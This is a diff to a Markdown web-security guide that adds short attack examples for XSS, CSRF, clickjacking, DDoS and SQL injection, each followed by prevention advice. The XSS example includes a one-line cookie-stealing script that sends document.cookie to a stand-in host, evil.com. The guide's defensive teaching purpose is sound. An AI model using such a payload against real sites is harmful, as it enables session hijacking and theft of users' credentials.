@@ -1461,25 +1461,35 @@ The `async` attribute also allows the script to be downloaded in parallel to HTM
 ### XSS (Cross-Site Scripting)
 XSS attacks occur when an attacker injects malicious JavaScript code into a web application's output. The injected code executes within the victim's browser when they visit the compromised web page.
 
+**Example:** An attacker could embed a script in a comment on a blog that sends the cookies of anyone viewing the comment to the attacker. This script might look something like `<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>`.
+
 **Prevention:** Ensure the encoding or escaping of user input on both the front-end and back-end. For example, convert `<` to `&lt;` and `>` to `&gt;`. Modern JavaScript frameworks like React automatically escape HTML to safeguard against XSS, significantly reducing the risk.
 
 ### CSRF (Cross-Site Request Forgery)
 In CSRF attacks, attackers trick users into executing unwanted actions on a web application where they're authenticated, leveraging the user's identity.
+
+**Example:** An attacker sends an email with a link to a malicious website. When the logged-in user clicks the link, the malicious site sends a request to a banking application to transfer money, exploiting the user's authenticated session.
 
 **Prevention:** Employ anti-CSRF tokens and set the `SameSite` attribute for cookies to `strict` to prevent cross-site request forgery. Limiting CORS (Cross-Origin Resource Sharing) and utilizing authentication mechanisms also bolster security.
 
 ### Clickjacking
 Clickjacking tricks users into clicking on something different from what the user perceives, often by embedding a page as a transparent iframe.
 
+**Example:** An attacker places a transparent iframe over a button on a legitimate website. The user thinks they are clicking the legitimate button, but they are actually clicking a button within the iframe, potentially revealing sensitive information or agreeing to a malicious action.
+
 **Prevention:** To prevent clickjacking, ensure that your website does not allow itself to be embedded in an iframe on another site by setting the `X-Frame-Options` header to `SAMEORIGIN`. Also, verify that `window.top.location.hostname` is the same as `window.location.hostname`; if not, redirect the user appropriately.
 
 ### DDoS (Distributed Denial of Service)
 DDoS attacks flood a server with numerous requests to exhaust resources and bandwidth, rendering the service unavailable to legitimate users.
 
+**Example:** A group of compromised computers (botnet) is used to flood an e-commerce site with so much traffic that legitimate customers cannot access the site during a major sale event.
+
 **Prevention:** DDoS protection is challenging to implement at the software level alone; employing cloud-based DDoS protection services or Web Application Firewalls (WAF) can help mitigate these attacks.
 
 ### SQL Injection
 SQL Injection attacks occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application.
+
+**Example:** An attacker inserts a SQL statement into a form field (e.g., login form) that is designed to log in users. This SQL statement is crafted to grant the attacker unauthorized access to the database, potentially allowing them to view sensitive information.
 
 **Prevention:** Safeguard against SQL Injection by validating and sanitizing all user inputs. Utilize prepared statements and parameterized queries to ensure the database executes only the intended queries, not the injected malicious code.
 
